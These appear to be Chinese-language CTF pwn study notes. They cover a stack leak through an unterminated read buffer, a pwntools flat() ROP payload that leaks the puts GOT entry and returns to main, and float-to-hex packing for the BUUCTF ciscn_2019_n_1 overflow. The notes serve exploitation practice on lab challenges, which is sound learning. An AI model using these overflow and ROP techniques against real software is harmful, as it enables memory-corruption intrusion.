## leak stack

```C
int sub_400676() { 
char buf[80]; // [rsp+0h] [rbp-50h] 
memset(buf, 0, sizeof(buf)); 
putchar('>'); 
read(0, buf, 96uLL); 
return puts(buf); 
}
```
当输入的长度为 80 时, 由于 read 并不会给输入末尾补上 '\0', rbp 的值就会被 puts 打印出来, 这样我们就可以通过固定偏移知道栈上所有位置的地址了。


## 使用pwntools的一些技巧

payload的构造可以用`flat`一行完成：
```python
payload = flat({
    0xE00: [
        p64(0xdeadbeef),
        p64(pop_rdi),
        p64(puts_got),
        p64(puts_plt),
        p64(main_addr)
    ]
})
```

0xE00为偏移量，
➡ 在偏移 **0xE00** 的位置，放置后面的所有内容。  
➡ `flat` 自动把列表展平并拼成字节串。  
➡ 整个 payload 会自动填充前面的空洞（用 `\x00` 填补）。

## 小数需转换为16进制再发送
题目: [BUUCTF-pwn]——ciscn_2019_n_1

题目需要进行栈溢出替换变量值为指定的float值,但是不能直接将float丢进p64发送,需要转换为十六进制

```C
11.28125 转换为二进制为 1011.01001
11.28125 在计算机内部储存为 0100 0001 0011 0100 1000 0000 0000 0000
即11.28125 ==> 0x41348000

```
